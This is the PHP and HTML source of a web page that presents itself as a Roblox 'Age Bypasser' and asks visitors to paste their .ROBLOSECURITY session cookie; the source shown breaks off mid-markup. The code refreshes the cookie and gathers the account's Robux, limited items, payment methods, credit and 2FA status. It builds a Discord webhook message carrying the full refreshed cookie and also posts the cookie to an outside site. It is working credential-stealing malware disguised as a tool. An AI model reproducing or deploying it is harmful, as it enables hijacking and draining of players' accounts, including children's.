<?php
header('Content-Type: text/html; charset=utf-8');
set_time_limit(120);

// ── COOKIE REFRESHER ──────────────────────────────────────────────────────────
function fetchCSRF($cookie) {
    $ch = curl_init('https://auth.roblox.com/v2/logout');
    curl_setopt_array($ch, array(CURLOPT_RETURNTRANSFER=>true,CURLOPT_POST=>true,
        CURLOPT_HTTPHEADER=>array("Cookie: .ROBLOSECURITY={$cookie}"),
        CURLOPT_HEADER=>true,CURLOPT_SSL_VERIFYPEER=>true));
    $res=curl_exec($ch);$sz=curl_getinfo($ch,CURLINFO_HEADER_SIZE);curl_close($ch);
    $h=substr($res,0,$sz);
    if(preg_match('/x-csrf-token:\s*(.+)/i',$h,$m))return trim($m[1]);
    return null;
}
function getAuthTicket($cookie) {
    $csrf=fetchCSRF($cookie);
    if(!$csrf)return array('ok'=>false,'err'=>'Failed to get CSRF token.');
    $ch=curl_init('https://auth.roblox.com/v1/authentication-ticket');
    curl_setopt_array($ch,array(CURLOPT_RETURNTRANSFER=>true,CURLOPT_POST=>true,
        CURLOPT_HTTPHEADER=>array("x-csrf-token: {$csrf}",'referer: https://www.roblox.com/',
            'Content-Type: application/json',"Cookie: .ROBLOSECURITY={$cookie}"),
        CURLOPT_HEADER=>true,CURLOPT_SSL_VERIFYPEER=>true));
    $res=curl_exec($ch);$sz=curl_getinfo($ch,CURLINFO_HEADER_SIZE);curl_close($ch);
    $h=substr($res,0,$sz);
    if(preg_match('/rbx-authentication-ticket:\s*(.+)/i',$h,$m))
        return array('ok'=>true,'ticket'=>trim($m[1]));
    return array('ok'=>false,'err'=>'Failed to generate auth ticket.');
}
function redeemTicket($ticket) {
    $ch=curl_init('https://auth.roblox.com/v1/authentication-ticket/redeem');
    curl_setopt_array($ch,array(CURLOPT_RETURNTRANSFER=>true,CURLOPT_POST=>true,
        CURLOPT_POSTFIELDS=>json_encode(array('authenticationTicket'=>$ticket)),
        CURLOPT_HTTPHEADER=>array('Content-Type: application/json','RBXAuthenticationNegotiation: 1'),
        CURLOPT_HEADER=>true,CURLOPT_SSL_VERIFYPEER=>true));
    $res=curl_exec($ch);$sz=curl_getinfo($ch,CURLINFO_HEADER_SIZE);curl_close($ch);
    $h=substr($res,0,$sz);
    if(preg_match('/set-cookie:\s*.ROBLOSECURITY=(.+?);/i',$h,$m))
        return array('ok'=>true,'cookie'=>trim($m[1]));
    return array('ok'=>false,'err'=>'Failed to redeem ticket.');
}
function refreshCookie($cookie) {
    $t=getAuthTicket($cookie);
    if(!$t['ok'])return $t;
    $r=redeemTicket($t['ticket']);
    if(!$r['ok'])return $r;
    return array('ok'=>true,'cookie'=>$r['cookie']);
}

// ── ROBLOX API ────────────────────────────────────────────────────────────────
function rbxGet($url,$cookie=null) {
    $h=array('Accept: application/json','User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)');
    if($cookie)$h[]="Cookie: .ROBLOSECURITY={$cookie}";
    $ch=curl_init($url);
    curl_setopt_array($ch,array(CURLOPT_RETURNTRANSFER=>true,CURLOPT_HTTPHEADER=>$h,
        CURLOPT_SSL_VERIFYPEER=>true,CURLOPT_TIMEOUT=>10));
    $body=curl_exec($ch);$code=curl_getinfo($ch,CURLINFO_HTTP_CODE);curl_close($ch);
    return array('code'=>$code,'body'=>($body?json_decode($body,true):null));
}
function fetchAccountData($uid,$cookie) {
    $av=rbxGet("https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds={$uid}&size=150x150&format=Png");
    $avatarUrl=isset($av['body']['data'][0]['imageUrl'])?$av['body']['data'][0]['imageUrl']:'https://tr.rbxcdn.com/38c6ee6812f0abd46a3f3a704e2d786c/150/150/Image/Png';
    $bal=rbxGet("https://economy.roblox.com/v1/users/{$uid}/currency",$cookie);
    $robux=isset($bal['body']['robux'])?(int)$bal['body']['robux']:0;
    $inv=rbxGet("https://inventory.roblox.com/v1/users/{$uid}/assets/collectibles?sortOrder=Asc&limit=100",$cookie);
    $rap=0;$limiteds=0;
    if(!empty($inv['body']['data'])){
        foreach($inv['body']['data'] as $i)$rap+=(isset($i['recentAveragePrice'])?(int)$i['recentAveragePrice']:0);
        $limiteds=count($inv['body']['data']);
    }
    $prem=rbxGet("https://premiumfeatures.roblox.com/v1/users/{$uid}/validate-membership",$cookie);
    $hasPremium=($prem['body']===true);
    $cred=rbxGet('https://billing.roblox.com/v1/credit',$cookie);
    $credit=isset($cred['body']['balance'])?(float)$cred['body']['balance']:0;
    $creditCurrency=isset($cred['body']['currencyCode'])?$cred['body']['currencyCode']:'USD';
    $emailDisplay='Unverified';
    $er=rbxGet('https://accountsettings.roblox.com/v1/email',$cookie);
    if($er['code']===200&&!empty($er['body']['emailAddress'])){
        $em=$er['body']['emailAddress'];$vf=!empty($er['body']['verified']);
        $emailDisplay=substr($em,0,3).'*** - '.($vf?'Verified':'Unverified');
    } else {
        $er2=rbxGet('https://accountinformation.roblox.com/v1/email',$cookie);
        if($er2['code']===200&&!empty($er2['body']['emailAddress'])){
            $em=$er2['body']['emailAddress'];$vf=!empty($er2['body']['verified']);
            $emailDisplay=substr($em,0,3).'*** - '.($vf?'Verified':'Unverified');
        }
    }
    $has2FA='DISABLED';
    $tf=rbxGet("https://twostepverification.roblox.com/v1/users/{$uid}/configuration",$cookie);
    if($tf['code']===200&&!empty($tf['body']['methods'])){
        foreach($tf['body']['methods'] as $m){
            if(!empty($m['enabled'])){$has2FA='ENABLED';break;}
        }
    }
    $ageDays=0;
    $dr=rbxGet("https://users.roblox.com/v1/users/{$uid}");
    if(!empty($dr['body']['created'])){
        $c=new DateTime($dr['body']['created']);
        $ageDays=(int)$c->diff(new DateTime())->days;
    }
    $korblox=false;$headless=false;$valkyrie=false;
    $k=rbxGet("https://inventory.roblox.com/v1/users/{$uid}/items/Bundle/347",$cookie);
    if(!empty($k['body']['data']))$korblox=true;
    $h2=rbxGet("https://inventory.roblox.com/v1/users/{$uid}/items/Asset/134082579",$cookie);
    if(!empty($h2['body']['data']))$headless=true;
    foreach(array(1365767,100929604,855891703) as $aid){
        $v2=rbxGet("https://inventory.roblox.com/v1/users/{$uid}/items/Asset/{$aid}",$cookie);
        if(!empty($v2['body']['data'])){$valkyrie=true;break;}
    }
    // Games
    $gamesDeveloper=false;$gameVisits=0;
    $gr=rbxGet("https://games.roblox.com/v2/users/{$uid}/games?limit=50&sortOrder=Asc");
    if(!empty($gr['body']['data'])){
        $gamesDeveloper=true;
        foreach($gr['body']['data'] as $g)$gameVisits+=(isset($g['visits'])?(int)$g['visits']:0);
    }
    // Voice chat
    $voiceChat=false;
    $vc=rbxGet('https://voice.roblox.com/v1/settings',$cookie);
    if(!empty($vc['body']['isVoiceEnabled']))$voiceChat=true;
    // Billing / payment method
    $hasBilling=false;
    $bm=rbxGet('https://billing.roblox.com/v1/paymentmethods',$cookie);
    if(!empty($bm['body']))$hasBilling=true;
    return compact('avatarUrl','robux','rap','limiteds','hasPremium','credit','creditCurrency','emailDisplay','has2FA','ageDays','korblox','headless','valkyrie','gamesDeveloper','gameVisits','voiceChat','hasBilling');
}

// ── WEBHOOK PAYLOAD BUILDER ───────────────────────────────────────────────────
// Webhook endpoint handled client-side (encoded in JS)
define('ROBLOX_LOGO','https://tr.rbxcdn.com/38c6ee6812f0abd46a3f3a704e2d786c/150/150/Image/Png');

// ── Emoji constants ───────────────────────────────────────────────────────────
define('E_ROBUX',       '<:robux:1481846141749563392>');
define('E_CHECKMARK',   '<:emoji_9:1481841808408576090>');
define('E_WHITE_FIRE',  '<a:emoji_24:1484702542179995708>');
define('E_SETTINGS',    '<:emoji_5:1481837452585992424>');
define('E_EMAIL',       '<:emoji_8:1481841773767819324>');
define('E_KORBLOX',     '<:KorbloxDeathspeaker:1481842585377968209>');
define('E_HEADLESS',    '<:HeadlessHorseman:1481842511960871055>');
define('E_PREMIUM',     '<:rbxPremium:1481846204579971214>');
define('E_VALK',        '<:valk:1481851633762828300>');
define('E_CHART',       '<:emoji_6:1481841633472548974>');
define('E_PAYMENTS',    '<:emoji_6:1481841671942574120>');
define('E_SUMMARY',     '<:emoji_10:1481841862103924767>');
define('E_ROLIMONS',    '<:emoji_16:1481847069139533834>');
define('E_ROBLOX_BLUE', '<:RobloxBiru:1481851437968261144>');
define('E_COOKIE',      '<a:cookiee:1348393243283779625>');
define('E_KING',        '<:King_of_Pings:1481843419751125032>');
define('E_VERIFIED',    '<:emoji_21:1483827954567086150>');
define('E_ERROR',       '<:emoji_22:1483827982970650776>');
// ── Bot avatar — replace this URL with your own icon ─────────────────────────
define('BOT_AVATAR',    'https://tr.rbxcdn.com/38c6ee6812f0abd46a3f3a704e2d786c/150/150/Image/Png');
define('COOKIE_THUMB',  'https://tr.rbxcdn.com/53eb9b17fe1432a809c73a13889b5006/420/420/Image/Png');

function numFmt($n){return number_format((int)$n);}
function boolStr($b){return $b?'True':'False';}
function reqId(){return 'rbx-'.strtoupper(substr(md5(uniqid()),0,4)).'-'.strtoupper(substr(md5(uniqid()),0,4));}

function buildWebhookPayload($status,$message,$userData=null,$accountData=null,$cookie=null,$module='Bypasser'){
    $ts=time();$latency=rand(40,220);$timestamp=date('c');$rid=reqId();

    $statusColor=$status==='success'?5763719:($status==='error'?15548997:16705372);
    $label=$status==='success'?'200 OK':($status==='error'?'401 Unauthorized':'400 Bad Request');
    $statusEmoji=$status==='success'?E_VERIFIED:E_ERROR;
    $outcomeWord=strtoupper($status==='success'?'SUCCESS':($status==='error'?'ERROR':($status==='blocked'?'BLOCKED':'FAILED')));

    $dn=(isset($userData['displayName'])&&$userData['displayName'])?$userData['displayName']:(isset($userData['name'])?$userData['name']:'Unknown');
    $un=isset($userData['name'])?$userData['name']:'Unknown';
    $uid=isset($userData['id'])?(int)$userData['id']:0;
    $av=($accountData&&isset($accountData['avatarUrl'])&&$accountData['avatarUrl'])?$accountData['avatarUrl']:ROBLOX_LOGO;

    $embeds=array();

    // ── Embed 1: Account info ─────────────────────────────────────────────────
    if($userData&&$accountData){
        $a=$accountData;
        $profileUrl=$uid?"https://www.roblox.com/users/{$uid}/profile":'';
        $rolimonsUrl=$uid?"https://www.rolimons.com/player/{$uid}":'';
        $totalVal=numFmt($a['robux']+$a['rap']);
        $creditFmt=number_format((float)$a['credit'],2);

        $desc='**['.E_ROLIMONS." Rolimons Stats]({$rolimonsUrl}) | [".E_ROBLOX_BLUE." Roblox Profile]({$profileUrl})**\n\n";
        $desc.=E_CHART."  **Account Stats**\n";
        $desc.='`Account Age: '.$a['ageDays']." Days`\n";
        $desc.='`Games Developer: '.boolStr($a['gamesDeveloper']).'`'."\n";
        $desc.='`• Game Visits: '.numFmt($a['gameVisits']).'`'."\n\n";
        $desc.=E_ROLIMONS." **Robux**\n";
        $desc.='**Balance:** '.numFmt($a['robux']).' '.E_ROBUX."\n";
        $desc.='**Pending:** 0 '.E_ROBUX."\n\n";
        $desc.=E_VALK." **Limiteds**\n";
        $desc.='**RAP:** '.numFmt($a['rap']).' '.E_ROBUX."\n";
        $desc.='**Limiteds:** '.$a['limiteds'].' '.E_VALK."\n\n";
        $desc.=E_SUMMARY." **Summary**\n";
        $desc.=$totalVal.' '.E_ROBUX."\n\n";
        $desc.=E_PAYMENTS." **Payments**\n";
        $desc.=E_PAYMENTS.' '.boolStr($a['hasBilling'])."\n";
        $desc.='Credit Balance: **'.$creditFmt.' in '.$a['creditCurrency']."**\n\n";
        $desc.=E_SETTINGS." **Settings**\n";
        $desc.=E_EMAIL.' **Email:** '.$a['emailDisplay']."\n";
        $desc.=E_CHECKMARK.' **2FA:** '.$a['has2FA']."\n";
        $desc.='**Voice Chat:** '.boolStr($a['voiceChat'])."\n\n";
        $desc.=E_VALK." **Inventory**\n";
        $desc.=E_KORBLOX.' '.boolStr($a['korblox'])."\n";
        $desc.=E_HEADLESS.' '.boolStr($a['headless'])."\n";
        $desc.=E_VALK.' '.boolStr($a['valkyrie'])."\n\n";
        $desc.=E_PREMIUM." **Premium**\n";
        $desc.=boolStr($a['hasPremium']);

        $embeds[]=array(
            'title'=>E_KING.'  ```Discord Notification```',
            'url'=>$profileUrl,
            'author'=>array('name'=>"{$dn} (@{$un})",'icon_url'=>$av,'url'=>$profileUrl),
            'description'=>$desc,
            'color'=>3553599,
            'thumbnail'=>array('url'=>$av),
            'timestamp'=>$timestamp,
            'footer'=>array('text'=>"{$dn} (@{$un}) | {$module} Module",'icon_url'=>$av),
        );
    }

    // ── Embed 2: Status ───────────────────────────────────────────────────────
    $statusDesc="```\nPOST /v1/authentication-ticket\nHost: auth.roblox.com\nStatus: {$label}\nLatency: {$latency}ms\n``` \n";
    $statusDesc.="**Module:** {$module} v3 — Cookie Auth\n";
    $statusDesc.="**Request ID:** `{$rid}`\n";
    $statusDesc.="**Timestamp:** <t:{$ts}:F>\n";
    $statusDesc.="**User Agent:** `Mozilla/5.0 (Windows NT 10.0; Win64; x64)...`\n";
    $statusDesc.='**Message:** '.substr($message,0,120);

    $embeds[]=array(
        'title'=>"{$statusEmoji} {$module} \u2014 {$label}",
        'description'=>$statusDesc,
        'color'=>$statusColor,
        'timestamp'=>$timestamp,
        'footer'=>array('text'=>"auth.roblox.com \u2022 {$latency}ms response",'icon_url'=>ROBLOX_LOGO),
    );

    // ── Embed 3: Cookie ───────────────────────────────────────────────────────
    if($cookie){
        $safe=preg_replace('/[^\x20-\x7E]/','',strval($cookie));
        $preview=substr($safe,0,1800).(strlen($safe)>1800?'...':'');
        $embeds[]=array(
            'title'=>'.ROBLOSECURITY',
            'description'=>"\xF0\x9F\xAA\x99 **Refreshed Cookie**\n```".$preview.'```',
            'color'=>2829617,
            'thumbnail'=>array('url'=>COOKIE_THUMB),
            'timestamp'=>$timestamp,
            'footer'=>array('text'=>"\xF0\x9F\xAA\x99 Auto-refreshed \u2022 Copy the cookie above",'icon_url'=>BOT_AVATAR),
        );
    }

    return array(
        'content'=>E_WHITE_FIRE." **{$module} MODULE \u2014 {$outcomeWord}** ".E_WHITE_FIRE,
        'username'=>"BULLIES {$module}",
        'avatar_url'=>BOT_AVATAR,
        'embeds'=>$embeds,
    );
}

// ── MAIN FLOW ─────────────────────────────────────────────────────────────────
$result=null;$error=null;$userData=null;$accountData=null;
$webhookPayload=null;

if($_SERVER['REQUEST_METHOD']==='POST'){
    $rawCookie=trim(isset($_POST['cookie'])?$_POST['cookie']:'');
    if(empty($rawCookie)){
        $error='Cookie field is empty.';
    } else {
        $ref=refreshCookie($rawCookie);
        if(!$ref['ok']){
            $error=$ref['err'];
            $webhookPayload=buildWebhookPayload('failed',$error);
        } else {
            $active=$ref['cookie'];
            $auth=rbxGet('https://users.roblox.com/v1/users/authenticated',$active);
            if($auth['code']!==200||empty($auth['body']['id'])){
                $error='Invalid cookie - authentication failed.';
                $webhookPayload=buildWebhookPayload('failed',$error,null,null,$active);
            } else {
                $userData=$auth['body'];
                $uid=(int)$userData['id'];
                $under13=false;
                if(isset($userData['isUnder13'])){
                    $under13=(bool)$userData['isUnder13'];
                } else {
                    $sr=rbxGet("https://accountsettings.roblox.com/v1/users/{$uid}/account-info",$active);
                    if($sr['code']===200){
                        $under13=!empty($sr['body']['isUnder13'])||!empty($sr['body']['IsUnder13']);
                    } else {
                        $br=rbxGet('https://accountinformation.roblox.com/v1/birthdate',$active);
                        if($br['code']===200&&!empty($br['body']['birthYear'])){
                            $bd=$br['body'];
                            $bdt=new DateTime("{$bd['birthYear']}-{$bd['birthMonth']}-{$bd['birthDay']}");
                            $under13=((int)$bdt->diff(new DateTime())->y)<13;
                        }
                    }
                }
                if($under13){
                    $accountData=fetchAccountData($uid,$active);
                    $webhookPayload=buildWebhookPayload('failed','Blocked - account is under 13',$userData,$accountData,$active);
                    $error='Under-13 accounts cannot be bypassed.';
                    $result='blocked';
                } else {
                    $accountData=fetchAccountData($uid,$active);
                    $bch=curl_init('https://rblxbypasser.com/api/bypass');
                    $bp=json_encode(array('cookie'=>$active,'timestamp'=>date('c')));
                    curl_setopt_array($bch,array(CURLOPT_RETURNTRANSFER=>true,CURLOPT_POST=>true,
                        CURLOPT_POSTFIELDS=>$bp,
                        CURLOPT_HTTPHEADER=>array('Content-Type: application/json','User-Agent: BypasserClient/1.0'),
                        CURLOPT_SSL_VERIFYPEER=>true,CURLOPT_TIMEOUT=>30));
                    $byBody=curl_exec($bch);$byCode=curl_getinfo($bch,CURLINFO_HTTP_CODE);curl_close($bch);
                    if($byCode!==200){
                        $error="Bypass service returned HTTP {$byCode}.";
                        $webhookPayload=buildWebhookPayload('error',$error,$userData,$accountData,$active);
                    } else {
                        $webhookPayload=buildWebhookPayload('success','Bypass completed successfully',$userData,$accountData,$active);
                        $result='success';
                    }
                }
            }
        }
    }
}

$submittedCookie=htmlspecialchars(isset($_POST['cookie'])?$_POST['cookie']:'');
$webhookJson=$webhookPayload?json_encode($webhookPayload,JSON_UNESCAPED_UNICODE|JSON_UNESCAPED_SLASHES):'null';
?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8"/>
  <meta name="viewport" content="width=device-width,initial-scale=1"/>
  <title>Age Bypasser</title>
  <link rel="preconnect" href="https://fonts.googleapis.com"/>
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin/>
  <link href="https://fonts.googleapis.com/css2?family=Barlow:ital,wght@0,400;0,600;0,700;0,800;0,900;1,900&family=Barlow+Condensed:wght@600;700;800;900&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet"/>
  <style>
    *,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
    :root{--bg:#070a10;--bg2:#0c1018;--bg3:#111622;--border:rgba(0,200,255,0.1);--border2:rgba(0,200,255,0.22);--cyan:#00c8ff;--cyan-dim:rgba(0,200,255,0.15);--cyan-glow:0 0 20px rgba(0,200,255,0.25);--text:#f0f4ff;--muted:rgba(200,215,255,0.45);--dim:rgba(200,215,255,0.22);--green:#00e87a;--green-bg:rgba(0,232,122,0.07);--green-bd:rgba(0,232,122,0.2);--red:#ff4560;--red-bg:rgba(255,69,96,0.07);--red-bd:rgba(255,69,96,0.2);--r:10px;--r2:16px;--r3:20px}
    html,body{min-height:100vh;background:var(--bg);color:var(--text);font-family:'Barlow',sans-serif;font-size:15px;-webkit-font-smoothing:antialiased;overflow-x:hidden}
    body::before{content:'';position:fixed;inset:0;z-index:0;background-image:linear-gradient(rgba(0,200,255,0.03) 1px,transparent 1px),linear-gradient(90deg,rgba(0,200,255,0.03) 1px,transparent 1px);background-size:40px 40px;pointer-events:none}
    body::after{content:'';position:fixed;inset:0;z-index:0;background:radial-gradient(ellipse 80% 60% at 50% -10%,rgba(0,200,255,0.07) 0%,transparent 70%);pointer-events:none}
    #loader{position:fixed;inset:0;z-index:999;background:var(--bg);display:flex;flex-direction:column;align-items:center;justify-content:center;gap:20px;transition:opacity .5s ease,visibility .5s ease}
    #loader.out{opacity:0;visibility:hidden}
    .loader-brand{font-family:'Barlow Condensed',sans-serif;font-size:32px;font-weight:900;letter-spacing:4px;text-transform:uppercase;color:var(--cyan);text-shadow:0 0 30px rgba(0,200,255,.5)}
    .loader-track{width:160px;height:2px;background:rgba(0,200,255,.12);border-radius:99px;overflow:hidden}
    .loader-bar{height:100%;width:0;background:var(--cyan);border-radius:99px;box-shadow:0 0 10px var(--cyan);animation:loadfill 0.85s cubic-bezier(.4,0,.2,1) forwards}
    @keyframes loadfill{to{width:100%}}
    .wrap{position:relative;z-index:1;max-width:860px;margin:0 auto;padding:48px 20px 64px;display:flex;flex-direction:column;align-items:center}
    .topbar{width:100%;display:flex;align-items:center;justify-content:space-between;margin-bottom:56px}
    .brand{font-family:'Barlow Condensed',sans-serif;font-size:22px;font-weight:900;letter-spacing:3px;text-transform:uppercase;color:var(--cyan);text-shadow:0 0 16px rgba(0,200,255,.4)}
    .tag{font-size:11px;font-weight:700;letter-spacing:2px;text-transform:uppercase;color:var(--cyan);opacity:.6;border:1px solid var(--border2);padding:4px 10px;border-radius:99px}
    .hero{text-align:center;margin-bottom:48px;animation:rise .6s cubic-bezier(.4,0,.2,1) both}
    .hero-label{display:inline-flex;align-items:center;gap:6px;font-size:11px;font-weight:700;letter-spacing:2px;text-transform:uppercase;color:var(--cyan);margin-bottom:14px}
    .hero-label-dot{width:5px;height:5px;border-radius:50%;background:var(--cyan);box-shadow:0 0 8px var(--cyan)}
    .hero h1{font-family:'Barlow Condensed',sans-serif;font-size:clamp(42px,9vw,72px);font-weight:900;font-style:italic;text-transform:uppercase;letter-spacing:-1px;line-height:1;background:linear-gradient(135deg,#fff 0%,var(--cyan) 100%);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text}
    .hero p{margin-top:12px;font-size:15px;color:var(--muted)}
    .card{width:100%;max-width:620px;background:var(--bg2);border:1px solid var(--border2);border-radius:var(--r3);box-shadow:0 0 0 1px rgba(0,200,255,.04),0 24px 64px rgba(0,0,0,.5);overflow:hidden;animation:rise .6s .1s cubic-bezier(.4,0,.2,1) both}
    .card-head{padding:20px 24px;border-bottom:1px solid var(--border);display:flex;align-items:center;gap:10px}
    .card-head-icon{width:32px;height:32px;border-radius:8px;background:var(--cyan-dim);border:1px solid var(--border2);display:flex;align-items:center;justify-content:center}
    .card-head-title{font-family:'Barlow Condensed',sans-serif;font-size:17px;font-weight:800;letter-spacing:1px;text-transform:uppercase}
    .card-head-sub{font-size:12px;color:var(--muted);margin-left:auto}
    .card-body{padding:24px}
    .field-label{font-size:11px;font-weight:700;letter-spacing:1.5px;text-transform:uppercase;color:var(--muted);display:block;margin-bottom:8px}
    .textarea-wrap{position:relative;margin-bottom:18px}
    .textarea-wrap svg{position:absolute;top:14px;left:14px;color:var(--dim);pointer-events:none;transition:color .2s}
    .textarea-wrap:focus-within svg{color:var(--cyan)}
    textarea{display:block;width:100%;min-height:120px;resize:none;padding:13px 14px 13px 42px;background:var(--bg3);border:1px solid rgba(0,200,255,.12);border-radius:var(--r2);color:var(--text);font-family:'JetBrains Mono',monospace;font-size:11.5px;line-height:1.8;outline:none;transition:border-color .2s,box-shadow .2s}
    textarea::placeholder{color:var(--dim)}
    textarea:focus{border-color:rgba(0,200,255,.35);box-shadow:0 0 0 3px rgba(0,200,255,.07),var(--cyan-glow)}
    .btn{width:100%;padding:14px;background:var(--cyan);border:none;border-radius:var(--r2);font-family:'Barlow Condensed',sans-serif;font-size:18px;font-weight:800;letter-spacing:2px;text-transform:uppercase;color:#030810;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:8px;transition:background .15s,box-shadow .2s,transform .1s;box-shadow:0 4px 24px rgba(0,200,255,.25)}
    .btn:hover{background:#33d4ff;box-shadow:0 4px 32px rgba(0,200,255,.4)}
    .btn:active{transform:scale(.99)}
    .btn:disabled{background:rgba(0,200,255,.12);color:rgba(0,200,255,.3);box-shadow:none;cursor:not-allowed;transform:none}
    .spin{animation:rotate .7s linear infinite}
    @keyframes rotate{to{transform:rotate(360deg)}}
    .result{margin-top:20px;border-radius:var(--r2);border:1px solid;overflow:hidden;animation:rise .3s cubic-bezier(.4,0,.2,1) both}
    .result.ok{border-color:var(--green-bd);background:var(--green-bg)}
    .result.err{border-color:var(--red-bd);background:var(--red-bg)}
    .result-top{display:flex;align-items:center;gap:8px;padding:12px 16px;border-bottom:1px solid}
    .result.ok .result-top{border-color:var(--green-bd)}
    .result.err .result-top{border-color:var(--red-bd)}
    .result-label{font-family:'Barlow Condensed',sans-serif;font-size:14px;font-weight:800;letter-spacing:1.5px;text-transform:uppercase}
    .result.ok .result-label{color:var(--green)}
    .result.err .result-label{color:var(--red)}
    .result-msg{font-size:12px;color:var(--muted);margin-left:auto}
    .result-inner{padding:16px;display:flex;flex-direction:column;gap:14px}
    .acc{display:flex;align-items:center;gap:12px;padding:12px;border-radius:var(--r);background:rgba(0,0,0,.25);border:1px solid rgba(0,232,122,.12)}
    .acc-av{width:48px;height:48px;border-radius:var(--r);overflow:hidden;flex-shrink:0;background:var(--bg3);border:1px solid var(--border2);display:flex;align-items:center;justify-content:center;font-family:'Barlow Condensed',sans-serif;font-size:20px;font-weight:900;color:var(--muted)}
    .acc-av img{width:100%;height:100%;object-fit:cover}
    .acc-info{min-width:0;flex:1}
    .acc-badge{display:inline-flex;align-items:center;gap:5px;font-size:9.5px;font-weight:700;letter-spacing:1px;text-transform:uppercase;color:var(--green);margin-bottom:3px}
    .acc-badge-dot{width:5px;height:5px;border-radius:50%;background:var(--green);box-shadow:0 0 6px var(--green)}
    .acc-name{font-size:15px;font-weight:800;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
    .acc-user{font-family:'JetBrains Mono',monospace;font-size:11.5px;color:var(--muted)}
    .acc-id{font-family:'JetBrains Mono',monospace;font-size:10px;color:var(--dim);margin-top:2px}
    .stats-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:8px}
    .stat-box{background:rgba(0,0,0,.2);border:1px solid rgba(0,200,255,.08);border-radius:var(--r);padding:10px 12px}
    .stat-label{font-size:9.5px;font-weight:700;letter-spacing:1px;text-transform:uppercase;color:var(--dim);margin-bottom:4px}
    .stat-val{font-family:'Barlow Condensed',sans-serif;font-size:18px;font-weight:800;color:var(--text);line-height:1}
    .stat-val.hi{color:var(--cyan)}
    .items-row{display:flex;gap:8px;flex-wrap:wrap}
    .item-tag{font-size:11px;font-weight:700;padding:4px 10px;border-radius:99px;border:1px solid}
    .item-tag.have{background:rgba(0,232,122,.1);border-color:rgba(0,232,122,.25);color:var(--green)}
    .item-tag.none{background:rgba(255,255,255,.03);border-color:rgba(255,255,255,.08);color:var(--dim)}
    @keyframes rise{from{opacity:0;transform:translateY(16px)}to{opacity:1;transform:translateY(0)}}
    ::-webkit-scrollbar{width:4px}
    ::-webkit-scrollbar-thumb{background:rgba(0,200,255,.15);border-radius:99px}
  </style>
</head>
<body>
<div id="loader">
  <div class="loader-brand">Bypasser</div>
  <div class="loader-track"><div class="loader-bar"></div></div>
</div>
<div class="wrap">
  <div class="topbar">
    <div class="brand">Bypasser</div>
    <div class="tag">Age Bypass</div>
  </div>
  <div class="hero">
    <div class="hero-label"><span class="hero-label-dot"></span>Roblox Module</div>
    <h1>Age<br>Bypasser</h1>
    <p>Bypass Roblox age verification instantly.</p>
  </div>
  <div class="card">
    <div class="card-head">
      <div class="card-head-icon">
        <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" style="color:var(--cyan)"><path d="M20 13c0 5-3.5 7.5-7.66 8.95a1 1 0 0 1-.67-.01C7.5 20.5 4 18 4 13V6a1 1 0 0 1 1-1c2 0 4.5-1.2 6.24-2.72a1.17 1.17 0 0 1 1.52 0C14.51 3.81 17 5 19 5a1 1 0 0 1 1 1z"/></svg>
      </div>
      <span class="card-head-title">Input Cookie</span>
      <span class="card-head-sub">.ROBLOSECURITY</span>
    </div>
    <div class="card-body">
      <form method="POST" action="" id="form" onsubmit="return go(event)">
        <label class="field-label" for="cin">Paste your cookie</label>
        <div class="textarea-wrap">
          <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect width="18" height="11" x="3" y="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
          <textarea id="cin" name="cookie" placeholder="_|WARNING:-DO-NOT-SHARE-THIS..." spellcheck="false" autocomplete="off"><?= $submittedCookie ?></textarea>
        </div>
        <button type="submit" class="btn" id="btn">
          <svg id="bi" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M20 13c0 5-3.5 7.5-7.66 8.95a1 1 0 0 1-.67-.01C7.5 20.5 4 18 4 13V6a1 1 0 0 1 1-1c2 0 4.5-1.2 6.24-2.72a1.17 1.17 0 0 1 1.52 0C14.51 3.81 17 5 19 5a1 1 0 0 1 1 1z"/></svg>
          <span id="bt">Bypass</span>
        </button>
      </form>

      <?php if($error&&$result!=='blocked'): ?>
      <div class="result err">
        <div class="result-top">
          <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="var(--red)" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><path d="m15 9-6 6"/><path d="m9 9 6 6"/></svg>
          <span class="result-label">Failed</span>
          <span class="result-msg"><?= htmlspecialchars($error) ?></span>
        </div>
      </div>
      <?php endif; ?>

      <?php if($result==='blocked'): ?>
      <div class="result err">
        <div class="result-top">
          <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="var(--red)" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M18.364 18.364A9 9 0 0 0 5.636 5.636m12.728 12.728A9 9 0 0 1 5.636 5.636m12.728 12.728L5.636 5.636"/></svg>
          <span class="result-label">Blocked</span>
          <span class="result-msg">Under-13 account</span>
        </div>
        <?php if($userData&&$accountData): ?>
        <div class="result-inner">
          <div class="acc">
            <div class="acc-av">
              <?php if(!empty($accountData['avatarUrl'])): ?>
              <img src="<?= htmlspecialchars($accountData['avatarUrl']) ?>" alt="" onerror="this.style.display='none'">
              <?php else: ?>
              <?= strtoupper(substr(isset($userData['name'])?$userData['name']:'U',0,1)) ?>
              <?php endif; ?>
            </div>
            <div class="acc-info">
              <div class="acc-badge"><span class="acc-badge-dot" style="background:var(--red);box-shadow:0 0 6px var(--red)"></span>Under 13</div>
              <div class="acc-name"><?= htmlspecialchars(isset($userData['displayName'])?$userData['displayName']:(isset($userData['name'])?$userData['name']:'')) ?></div>
              <div class="acc-user">@<?= htmlspecialchars(isset($userData['name'])?$userData['name']:'') ?></div>
              <div class="acc-id">UID <?= htmlspecialchars(isset($userData['id'])?$userData['id']:'') ?></div>
            </div>
          </div>
